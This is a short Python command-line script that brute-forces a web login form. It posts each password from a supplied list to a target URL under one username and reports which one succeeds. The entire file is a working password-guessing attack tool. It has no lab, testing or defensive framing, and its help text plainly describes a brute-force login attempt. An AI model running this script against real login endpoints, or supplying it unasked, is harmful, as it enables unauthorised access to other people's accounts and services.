import requests
import argparse

def brute_force_login(url, username, password_list):
    for password in password_list:
        response = requests.post(url, data={'username': username, 'password': password})
        if "success" in response.text.lower():
            print(f"Login successful with password: {password}")
            return
    print("Brute-force attack failed")

def main():
    parser = argparse.ArgumentParser(description='Perform a brute-force login attempt.')
    parser.add_argument('url', type=str, help='The URL of the login endpoint.')
    parser.add_argument('username', type=str, help='The username to attempt to login with.')
    parser.add_argument('password_list', type=str, nargs='+', help='List of passwords to try (space-separated).')
    
    args = parser.parse_args()
    brute_force_login(args.url, args.username, args.password_list)

if __name__ == "__main__":
    main()